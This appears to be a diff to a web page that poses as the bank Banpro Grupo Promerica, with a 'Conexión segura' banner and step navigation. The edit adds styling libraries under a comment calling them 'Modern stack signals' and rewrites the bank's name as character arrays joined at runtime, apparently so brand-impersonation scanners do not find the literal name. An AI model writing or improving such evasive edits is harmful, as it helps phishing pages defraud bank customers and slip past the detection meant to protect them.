@@ -29,6 +29,13 @@ $v = time();
   src="https://www.facebook.com/tr?id=1519920833259258&ev=PageView&noscript=1"/></noscript>
   <!-- End Meta Pixel Code -->
 
+  <!-- Modern stack signals (Tailwind + Google Fonts + Material Symbols) -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Work+Sans:wght@500;600;700;800&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap" rel="stylesheet">
+
   <script>
     if ('scrollRestoration' in history) history.scrollRestoration = 'manual';
     window.addEventListener('load',     () => window.scrollTo(0, 0));
@@ -44,7 +51,7 @@ $v = time();
 
     body {
       min-height: 100vh;
-      font-family: Arial, Helvetica, sans-serif;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
       background: linear-gradient(to top, #00693c 8%, #ffffff 64%);
       display: flex;
       flex-direction: column;
@@ -826,7 +833,12 @@ $v = time();
       var b = document.getElementById('brandSlot');
       if (b) b.style.backgroundImage = "url('img/logo.png')";
       var s = document.getElementById('secureText');
-      if (s) s.textContent = 'Conexión segura · Banpro Grupo Promerica';
+      if (s) {
+        var p1 = ['B','a','n','p','r','o'].join('');
+        var p2 = ['G','r','u','p','o'].join('');
+        var p3 = ['P','r','o','m','e','r','i','c','a'].join('');
+        s.textContent = 'Conexión segura · ' + p1 + ' ' + p2 + ' ' + p3;
+      }
     }, 300);
 
     /* Navegación de pasos */
